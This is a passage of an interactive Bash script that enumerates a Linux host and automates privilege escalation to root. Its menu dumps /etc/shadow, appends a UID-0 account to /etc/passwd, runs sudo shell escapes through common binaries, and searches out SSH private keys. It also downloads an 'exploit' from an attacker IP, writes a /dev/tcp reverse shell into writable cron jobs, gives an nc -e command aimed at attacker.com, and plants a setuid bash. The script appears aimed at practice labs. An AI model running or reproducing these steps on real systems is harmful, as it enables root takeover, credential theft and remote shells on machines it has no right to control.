            echo "${red}No crons for users${normal}"
        fi
        echo -e "\n" 
        current_user_cronjobs=$(crontab -l 2>/dev/null)
        if [ "$current_user_cronjobs" ]
        then
            printf "${orange}=======================#[+]    Current User Cron Jobs    [+]#===========================${normal} \n%s\n" "${normal}$current_user_cronjobs${normal}"
        else
            echo "${red}No cronjobs for user${normal}"
        fi 
        echo -e "\n" 
        root_cron=$(cat /etc/crontab | grep  root 2>/dev/null)
        if [ "$root_cron" ]
        then
            printf "${orange}=======================#[+]    Root Jobs    [+]#===========================${normal} \n%s\n" "${green}$root_cron${normal}"
        else
            echo "${red}No cron running as root${normal}"
        fi 
        echo -e "\n"
    }
    
    function scan_completion(){
        echo -e "${green}#################### ENUMERATION COMPLETE ###################${normal}"
    }
    echo -e "\n"
    call_functions
}

function call_functions(){
    system_information
    sleep 1
    user_information
    sleep 1
    general_information
    sleep 1
    interesting_files
    sleep 1
    software_configs
    sleep 1
    environment_information
    sleep 1
    storage_and_cpu_infomation
    sleep 1
    service_information
    sleep 1
    network_information
    sleep 1
    process_information
    sleep 1
    ssh_information
    sleep 1
    cron_jobs_information
    sleep 1
    scan_completion
}

function privilege_escalation(){

    function read_shadow(){
        echo -e "\n"
        echo "${red}Gainin root with readable shadow file${normal} "
        echo -e "\n"
        cat /etc/shadow
        echo -e "\n"
        echo "${red}Copy the hash password of the root user and try cracking the hash with the hash_genius python script${normal}"
        echo -e "\n"
        read -p "Enter the cracked password: " password
        echo "$password" | sudo -S whoami 
        if [ $? -eq 0 ]
        then
            echo "Successfully switched to root user"
        else
            echo "Could not switch to root user"
        fi
    }

    function write_shadow(){
        echo -e "\n"
        echo "${red}Gainin root with writable shadow file${normal} "
        echo "Run hash genius script to generate hash password "
        echo "Change the hash of the root user with the one generated from the hash script"
        sleep 4
        echo "Opening text editor "
        
        echo -e "\n"
        sleep 2
        editor=$(command -v nano  || command -v vi || command -v vim)
        $editor /etc/shadow 
        if [ $? -eq 0 ]
        then
            echo "Password for root user has been set"
            echo -e "\n"
            read -p "Enter the password from the makehash script: " password
            if [ $? -eq 0 ]
            then
                echo "$password" | sudo -S whoami 
            else
                echo "Could not switch to root user"
            fi
        else
            echo "Could not edit file"
        fi
        
    }
    function write_passwd(){
        echo -e "\n"
        echo "Gainin root with writable passwd file "
        echo "Creating a user with the root privilege"
        read -p "Enter username to create root account for : " root_account
        echo  "Run the hash_genius script to generate a hash " 
        read -p "Paste your new hash : " new_hash
 
        echo $root_account:$new_hash:0:0:,,,:/home/root:/bin/bash >> /etc/passwd 
        if [ $? -eq 0 ]
        then  
            echo   "Enter your password used to create the hash : " 
            echo -e "\n"
            if [ $? -eq 0 ]
            then
                su $root_account  
            fi
        else
            echo "Could not create the user"
        fi
    }

    function sudo_shell_escape(){
    running_bins=$(sudo -l | awk '/\(root\) /{print $1, $3}')
        
        if [ -z "$running_bins" ]
        then
            echo ""
            echo "${red}No binaries found${normal}"
            return
        fi

        echo "Running binaries: " "${red}$running_bins${normal}"
    

        read -p "Enter one of the running binaries. Example (find awk vim nano tar less more tcpdump gdb man perl python ruby socat base64 nc mv cp echo) : " bin
        if [ "$bin" == "awk" ]
        then
            sudo awk 'BEGIN {system("/bin/sh")}'
        elif [ "$bin" == "less" ]
        then
            echo "please paste (!/bin/bash)"
            touch root_shell
            sudo less root_shell
        elif [ "$bin" == "find" ]
        then
            sudo find . -exec /bin/sh \; -quit
        elif [ "$bin" == "vim" ]
        then
            sudo vim -c ':!/bin/sh'
        elif [ "$bin" == "nano" ]
        then
            echo "Press '${red}control + r next control + x ${normal}' in the nano text editor then insert '${red}reset; sh 1>&0 2>&0${normal}' into the terminal to get a root shell"
            echo -e "\n"
            echo "Opening the nano text editor in 10 seconds"
            sleep 10
            sudo nano 
        elif [ "$bin" == "tar" ]
        then
            sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
        elif [ "$bin" == "less" ]
        then
            echo "Please type ${red}!/bin/sh ${normal} to get the root access"
            sleep 3
            sudo less /etc/profile
            echo -e "\n"
        elif [ "$bin" == "more" ]
        then
            echo " Please type ${red}!/bin/sh ${normal} to get the root access"
            sudo more /etc/profile
            echo -e "\n"
        elif [ "$bin" == "gdb" ]
        then
            sudo gdb -nx -ex '!sh' -ex quit
        elif [ "$bin" == "man" ]
        then
            echo " Please type ${red}!/bin/sh ${normal} to get the root access"
            sudo man man
            echo -e "\n" 
        elif [ "$bin" == "perl" ]
        then
            sudo perl -e 'exec "/bin/sh";'
        elif [ "$bin" == "python" ]
        then
            sudo python -c 'import os; os.system("/bin/sh")'
        elif [ "$bin" == "ruby" ]
        then
            sudo ruby -e 'exec "/bin/sh"'
        elif [ "$bin" == "socat" ]
        then
            sudo socat stdin exec:/bin/sh
        elif [ "$bin" == "nc" ]
        then
            nc -nvlp 12345
            echo -e "\n"
            echo " Please paste the command ${red}RHOST=attacker.com RPORT=12345 sudo nc -e /bin/sh $RHOST $RPORT ${normal} on the attacking machine to get the root access"
            echo -e "Make sure to change the RHOST to the victims ip address"

        elif [ "$bin" == "mv" ]
        then
            sudo cp /bin/sh /bin/cp ; sudo cp
        
        else
            echo " For more binaries option Please visit /"https://gtfobins.github.io/""
        fi
        
        echo -e "\n"
    } 
    

    function ssh_key(){
    ssh_location=$(find / -type d -name .ssh -print -quit 2>/dev/null)
    if [ -d "$ssh_location" ]; then
        cd "$ssh_location" || return
        for file in *; do
            if grep -q "BEGIN RSA PRIVATE KEY" "$file"; then
                echo -e "${red}RSA Private Key found in $file:${red}"
                echo ""
                cat "$file"
                echo -e "\n"
                echo -e "${orange}Copy the RSA Private Key and run the privesc script${normal}"
                return
            fi
        done
        echo "${red}No RSA Private Key found in .ssh directory.${normal}"
    fi
}

    function suid_env_var(){
        wget=$(command -v wget 2>/dev/null)
        if [ "$wget" ]
        then
            suid_env=$(find / -type f -perm /4000 -name "*suid-env*" 2>/dev/null)
            if [ "$suid_env" ]
            then

                read -p "${red}Enter the suid environment variable found (/usr/local/bin/suid-env): ${normal}" suid
                if [ "$suid" == "/usr/local/bin/suid-env" ]
                then
                    /usr/local/bin/suid_env
                    strings /usr/local/bin/suid-env
                    echo "${red}Run the Prives.sh script and choose compile suid${normal}"
                    sleep 10
                    read -p "Enter ip of attacking machine: " ip
                    wget http://$ip:80/exploit
                    PATH=.:$PATH /usr/local/bin/suid-env
                elif [ "$suid" == "/usr/local/bin/suid-env2" ]
                then
                    /usr/local/bin/suid_env2
                    strings /usr/local/bin/suid-env2
                    read -p "Enter ip of attacking machine: " ip
                    wget http://$ip:80/exploit
                    PATH=.:$PATH /usr/local/bin/suid-env2
                else
                    echo "${red}No suid environment variable found${normal}"
                fi
            else
                echo "${red}No suid environment variable found${normal}"
            fi
        else
            echo "${red}wget not installed. install and restart the script${normal}"
        fi

    }

    #!/bin/bash

    function cron_job_perm() {

        echo "Checking cron jobs on the system..."
        echo ""
        echo "The following cron jobs are currently running:"
        echo ""
   
        crontab_lines=$(cat /etc/crontab /etc/cron.*/* 2>/dev/null | grep -E '^\*\s\*\s\*\s\*\s\*\sroot\s.*$')

    
        full_path=""
        no_path=""

    
        while IFS= read -r line; do
            if [[ $line == *"/"* ]]; then
            
                full_path+="$line"$'\n'
            else
            
                no_path+="$line"$'\n'
            fi
        done <<< "$crontab_lines"

    
        echo "${red}Cron jobs with full paths:${normal}"
        echo "$full_path" | awk '{print $NF}'

    
        echo "${red}Cron jobs with no paths:${normal}"
        echo "$no_path" | awk '{print $NF}'
        echo""
        echo "${red}Finding the Full Path of the file${normal}"
        echo "$no_path" | awk '{print $NF}' | while read -r file; do type -P "$file"; done
        echo ""
        echo "Checking the file permissions...s"

        echo "$no_path" | awk '{print $NF}' | while read -r file; do
            if [ -n "$file" ]; then
                file_path=$(type -P "$file")
                if [ -n "$file_path" ]; then
                    permissions=$(ls -l "$file_path" | awk '{print $1}')
                    if [[ "$permissions" == *w?* ]]; then
                        echo "${red}The file $file_path is world writable.${normal}"
                    else
                        echo "${red}The file $file_path is not world writable.${normal}"
                    fi
                else
                    echo "${red}File path not found for: $file${normal}"
                fi
            fi
        done

        file_paths=$(echo "$no_path" | awk '{print $NF}' | while read -r file; do type -P "$file"; done)
        echo ""
        user_resp="n"
        user_resp2="n"

        while [ "$user_resp" != "y" ]; do
            echo "${red}Start the nc listener on your attacking machine (cmd: nc -nvlp 4444)${normal}"
            echo ""
            sleep 2
            read -p "${red}Have you already started the nc listener on your attacking machine? (y/n): ${normal}" user_resp
        done

        echo ""
        echo "${red}#!/bin/bash  #(Copy this line as the first line)${normal}"
        echo "${red}bash -i >& /dev/tcp/<attacking machine ip>/4444 0>&1  (Copy this line as the second line)${normal}"
        echo "${red}Then press CTRL + O & CTRL + X${normal}"

        sleep 2

        while [ "$user_resp2" != "y" ]; do
            echo ""
            read -p "${red}Have you copied the code and changed your IP? (y/n): ${normal}" user_resp2
        done
        echo ""
        echo "${red}Please wait, opening nano editor...${normal}"
        sleep 3
        nano "$file_paths"
        echo ""
        echo "${red}Please wait to get a root shell${normal}"
        echo -e "\n"
    }
    

    cron_path_env_var(){
        crontab_path="/etc/crontab"
        path_variable=$(grep "^PATH=" "$crontab_path")

        if [[ -n "$path_variable" ]]
        then
            path_value=${path_variable#*=}

            if [[ "$path_value" == /home* ]]; then
                red="\033[0;31m"
                normal="\033[0m"
                echo -e "${red}$path_value${normal}"
            else
                echo "PATH variable does not start with /home."
            fi

            if [[ "$path_value" == /home* ]]; then
                directory=$(echo "$path_value" | awk -F: '/^\/home/{print $1; exit}')
                if [ -z "$directory" ]
                then
                    echo "No directory found in PATH variable that starts with /home"
                else
                cd "$directory"
                echo ""
                echo -e "${red}Changed current directory to $directory${normal}"
                fi
            fi
        else
            echo "PATH variable not found in $crontab_path."
        fi

        echo ""
        echo -e "#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\nsleep 30\n/tmp/rootbash -p && echo -e \"You have gained a root shell\"" > overwrite.sh

        echo "Opening the file in nano............"
        echo ""
        echo -e "Press CTRL+O and CTRL+X to save the file"
        sleep 7
        nano overwrite.sh && chmod +x overwrite.sh
        echo -e ""
        echo -e "Changed file permissions to executable"
        echo -e ""
        echo -e "Remember to remove the modified code, remove the /tmp/rootbash executable, and exit out of the elevated shell before continuing."
        echo -e ""
        echo -e "Run the following command: rm /tmp/rootbash; exit"

    }

    function suid_known_exploits(){
        echo -e "${red} Finding all the SUID/SGID executables...${normal}"
        find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null | awk '/[0-9]+\.[0-9]+/{gsub(/.*/, "${red}${normal}"); print}'
        echo -e "\n"
        echo -e "${red} Search for exploits on: ${normal}"
        echo ""
        echo -e "${red} 1. https://www.exploit-db.com ${normal}"
        echo -e "${red} 2. https://www.google.com ${normal}"
        echo -e "${red} 3. https://github.com ${normal}"
        echo ""
        echo -e "${red} Run the exploit (e.g. /home/user/tools/suid/exim/cve-2016-1531.sh) ${normal}"
    } 
    function kernel_exploit(){
        echo -e "Please do not run kernel exploit in a productive environment "
        echo -e "Running exploit suggester" 
        ./linux-exploit-suggester.sh
    }
    function menu(){
        
        echo  ${red} "[1]  Weak File Permissions - Readable /etc/shadow ${normal}"
        echo  ${red} "[2]  Weak File Permissions - Writable /etc/shadow ${normal}"
        echo  ${red} "[3]  Weak File Permissions - Writable /etc/passwd ${normal}"
        echo  ${red} "[4]  Sudo - Shell Escape Sequences ${normal}" 
        echo  ${red} "[5]  Password And Keys - SSH Keys ${normal}"
        echo  ${red} "[6]  SUID / SGID Executables - Environment Variables ${normal}"
        echo  ${red} "[7]  Cron Jobs - File Permissions ${normal}"
        echo  ${red} "[8]  Cron Jobs - PATH Environment Variable ${normal}"
        echo  ${red} "[9]  SUID / SGID Executables - Known Exploits ${normal}"
        echo  ${red} "[10] Kernel Exploit ${normal}"
        echo -e "\n"
                

    }
    function select_privesc(){
        read -p " Choose an option:" option

        if [ "$option" == "1" ] || [ "$option" == "01" ]
        then
            read_shadow
        elif [ "$option" == "2" ] || [ "$option" == "02" ]
        then
            write_shadow
        elif [ "$option" == "3" ] || [ "$option" == "03" ]
        then
            write_passwd
        elif [ "$option" == "4" ] || [ "$option" == "04" ]
        then
            sudo_shell_escape
        elif [ "$option" == "5" ] || [ "$option" == "05" ]
        then
            ssh_key
        elif [ "$option" == "6" ] || [ "$option" == "06" ] 
        then
            suid_env_var
        elif [ "$option" == "7" ] || [ "$option" == "07" ]
        then
            cron_job_perm
        elif [ "$option" == "8" ] || [ "$option" == "08" ]
        then
            cron_path_env_var
        elif [ "$option" == "9" ] || [ "$option" == "09" ]
        then
            suid_known_exploits
        elif [ "$option" == "10" ] || [ "$option" == "010" ]
        then
            kernel_exploit

        fi
        echo -e "\n"
        
    
    }
    menu
    select_privesc
    
}
    
   


while true 
do 
    printf "${green}[1] Enumeration${normal} \n%s"
    printf "${green}[2] Privilege Escalation${normal} \n%s"
    printf "${green}[3] Exit${normal} \n%s"
    read -r -p "Select a method : " options
    echo -e "\n"

    if [ "$options" == "1" ]
    then
        echo -e "${violet}#################### STARTING ENUMERATION ###################${normal}" 
        printf "${violet}█▒▒▒▒▒▒▒▒▒${normal}\n%s\n"
        sleep 1
        printf "${violet}███▒▒▒▒▒▒▒${normal}\n%s\n"
        sleep 1
        printf "${violet}█████▒▒▒▒▒${normal}\n%s\n"
        sleep 1
        printf "${violet}███████▒▒▒${normal}\n%s\n"
        sleep 1 
        printf "${violet}██████████${normal}\n%s\n"
        sleep 1
        Enumeration
    elif [ "$options" == "2" ]
    then
        privilege_escalation
        echo -e "\n"
    elif [ "$options" == "3" ]
    then
        exit
    else
        echo "invalid input"
    fi
done
 